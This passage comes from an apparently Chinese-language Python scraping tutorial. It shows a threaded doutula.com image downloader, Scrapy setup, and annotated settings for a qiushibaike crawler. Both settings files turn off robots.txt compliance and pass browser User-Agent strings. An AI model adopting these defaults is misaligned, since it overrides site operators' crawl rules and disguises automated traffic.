class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, page_queue, img_queue, headers, *args, **kwargs</span>):</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>().__init__(*args, **kwargs)</span><br><span class=\"line\">\t\tself.page_queue = page_queue</span><br><span class=\"line\">\t\tself.img_queue = img_queue</span><br><span class=\"line\">\t\tself.headers = headers</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> self.img_queue.empty() <span class=\"keyword\">and</span> self.page_queue.empty():</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\timg_url, img_name = self.img_queue.get()</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\"># 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片</span></span><br><span class=\"line\">\t\t\t\trequest.urlretrieve(img_url, <span class=\"string\">&#x27;./smile/&#x27;</span>+img_name)</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(img_name + <span class=\"string\">&#x27; 下载成功...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(<span class=\"string\">&#x27;./smile&#x27;</span>):</span><br><span class=\"line\">\t\tos.mkdir(<span class=\"string\">&#x27;./smile&#x27;</span>)</span><br><span class=\"line\">\theaders = &#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class=\"line\">\t\t\t\t\t  <span class=\"string\">&#x27;Chrome/80.0.3987.149 Safari/537.36 &#x27;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpage_queue = queue.Queue(<span class=\"number\">100</span>)</span><br><span class=\"line\">\timg_queue = queue.Queue(<span class=\"number\">1000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">\t\turl = <span class=\"string\">&#x27;https://www.doutula.com/photo/list/?page=&#x27;</span> + <span class=\"built_in\">str</span>(x)</span><br><span class=\"line\">\t\tpage_queue.put(url)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = ProimgUrl(page_queue, img_queue, headers)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = ConimgName(page_queue, img_queue, headers)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的</li>\n</ul>\n<h1 id=\"爬虫第五天\"><a href=\"#爬虫第五天\" class=\"headerlink\" title=\"爬虫第五天\"></a>爬虫第五天</h1><h2 id=\"scrapy爬虫框架\"><a href=\"#scrapy爬虫框架\" class=\"headerlink\" title=\"scrapy爬虫框架\"></a>scrapy爬虫框架</h2><p><a href=\"https://zhuanlan.zhihu.com/p/25443389\">关于xpath选择器selector的网址</a></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://img-blog.csdnimg.cn/20200328091921480.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"scrapy框架示意图\"></p>\n<ol>\n<li><p>创建项目</p>\n<p>​    scrapy startproject #^%#^(项目名字)</p>\n</li>\n<li><p>创建爬虫</p>\n<p>​    scrapy genspider 爬虫名字 网络域名</p>\n<p>注意：</p>\n<ul>\n<li>爬虫名字不要和项目名字一样</li>\n<li>网站域名是允许爬虫采集的域名<ul>\n<li>baidu.com</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"创建项目与配置环境后各部分组件\"></p>\n<p>item文件是存储数据的</p>\n<ul>\n<li><p>在setting文件（程序启动被首先检查的文件）</p>\n</li>\n<li><p>BOT_NAME = 爬虫的名字</p>\n</li>\n<li><p>ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔</p>\n</li>\n<li><p>CONCURRENT_REQUESTS = 爬虫的并发量</p>\n</li>\n<li><p>DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管</p>\n</li>\n<li><p>COOKLES_ENABLED = cookiede的使用，布尔</p>\n</li>\n<li><p>DEFAULT_REQUEST_HEADERS = 默认请求头</p>\n</li>\n<li><p>ITEM_PIPELINES = 管道文件</p>\n<h3 id=\"setting文件详解\"><a href=\"#setting文件详解\" class=\"headerlink\" title=\"setting文件详解\"></a>setting文件详解</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Scrapy settings for TestSpider project</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For simplicity, this file contains only settings considered important or</span></span><br><span class=\"line\"><span class=\"comment\"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"> </span><br><span class=\"line\">BOT_NAME = <span class=\"string\">&#x27;TestSpider&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">SPIDER_MODULES = [<span class=\"string\">&#x27;TestSpider.spiders&#x27;</span>]</span><br><span class=\"line\">NEWSPIDER_MODULE = <span class=\"string\">&#x27;TestSpider.spiders&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class=\"line\"><span class=\"comment\">#USER_AGENT = &#x27;TestSpider (+http://www.yourdomain.com)&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">USER_AGENT = <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Obey robots.txt rules</span></span><br><span class=\"line\"><span class=\"comment\"># Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。</span></span><br><span class=\"line\"><span class=\"comment\"># 默认是True，设置为False不遵守这个协议。</span></span><br><span class=\"line\">ROBOTSTXT_OBEY = <span class=\"literal\">False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class=\"line\"><span class=\"comment\"># 配置scrapy的请求连接数，默认会同时并发16个请求。</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS = 10</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class=\"line\"><span class=\"comment\"># See also autothrottle settings and docs</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0</span></span><br><span class=\"line\"><span class=\"comment\"># DOWNLOAD_DELAY = 3</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。</span></span><br><span class=\"line\"><span class=\"comment\"># The download delay setting will honor only one of:</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Disable cookies (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。</span></span><br><span class=\"line\"><span class=\"comment\"># COOKIES_ENABLED = False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Disable Telnet Console (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\">#TELNETCONSOLE_ENABLED = False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Override the default request headers:</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 配置默认的请求头Headers.</span></span><br><span class=\"line\"><span class=\"comment\"># DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Enable or disable spider middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。</span></span><br><span class=\"line\"><span class=\"comment\"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;TestSpider.middlewares.TestspiderSpiderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。</span></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable downloader middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;TestSpider.middlewares.TestspiderDownloaderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Enable or disable extensions</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class=\"line\"><span class=\"comment\"># EXTENSIONS = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Configure item pipelines</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。</span></span><br><span class=\"line\"><span class=\"comment\"># ITEM_PIPELINES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;TestSpider.pipelines.TestspiderPipeline&#x27;: 300,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 限速配置</span></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 是否开启自动限速</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># The initial download delay</span></span><br><span class=\"line\"><span class=\"comment\"># 配置初始url的下载延时</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># The maximum download delay to be set in case of high latencies</span></span><br><span class=\"line\"><span class=\"comment\"># 配置最大请求时间</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 配置请求和请求之间的下载间隔，单位是秒</span></span><br><span class=\"line\"><span class=\"comment\"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class=\"line\"><span class=\"comment\"># each remote server</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Enable showing throttling stats for every response received:</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 关于Http缓存的配置，默认是不启用。</span></span><br><span class=\"line\"><span class=\"comment\"># 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。</span></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class=\"line\"><span class=\"comment\">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"scrapy爬虫之spider类（示例-一：爬取糗事百科）\"><a href=\"#scrapy爬虫之spider类（示例-一：爬取糗事百科）\" class=\"headerlink\" title=\"scrapy爬虫之spider类（示例 一：爬取糗事百科）\"></a>scrapy爬虫之spider类（示例 一：爬取糗事百科）</h3><ul>\n<li>创建爬虫项目：scrapy startproject xiushi</li>\n<li>创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com</li>\n</ul>\n<h4 id=\"item-部分\"><a href=\"#item-部分\" class=\"headerlink\" title=\"item 部分\"></a>item 部分</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define here the models for your scraped items</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># See documentation in:</span></span><br><span class=\"line\"><span class=\"comment\"># https://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> scrapy</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">XiushiItem</span>(<span class=\"params\">scrapy.Item</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># define the fields for your item here like:</span></span><br><span class=\"line\">    <span class=\"comment\"># name = scrapy.Field()</span></span><br><span class=\"line\">    title = scrapy.Field()</span><br><span class=\"line\">    text = scrapy.Field()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"setting-部分\"><a href=\"#setting-部分\" class=\"headerlink\" title=\"setting 部分\"></a>setting 部分</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Scrapy settings for xiushi project</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For simplicity, this file contains only settings considered important or</span></span><br><span class=\"line\"><span class=\"comment\"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"></span><br><span class=\"line\">BOT_NAME = <span class=\"string\">&#x27;xiushi&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">SPIDER_MODULES = [<span class=\"string\">&#x27;xiushi.spiders&#x27;</span>]</span><br><span class=\"line\">NEWSPIDER_MODULE = <span class=\"string\">&#x27;xiushi.spiders&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class=\"line\"><span class=\"comment\"># USER_AGENT = &#x27;xiushi (+http://www.yourdomain.com)&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Obey robots.txt rules</span></span><br><span class=\"line\">ROBOTSTXT_OBEY = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS = 32</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class=\"line\"><span class=\"comment\"># See also autothrottle settings and docs</span></span><br><span class=\"line\">DOWNLOAD_DELAY = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"comment\"># The download delay setting will honor only one of:</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Disable cookies (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># COOKIES_ENABLED = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Disable Telnet Console (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># TELNETCONSOLE_ENABLED = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Override the default request headers:</span></span><br><span class=\"line\">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept&#x27;</span>: <span class=\"string\">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Language&#x27;</span>: <span class=\"string\">&#x27;en&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;Chrome/80.0.3987.163 Safari/537.36 &#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable spider middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;xiushi.middlewares.XiushiSpiderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable downloader middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;xiushi.middlewares.XiushiDownloaderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable extensions</span></span><br><span class=\"line\"><span class=\"comment\"># See 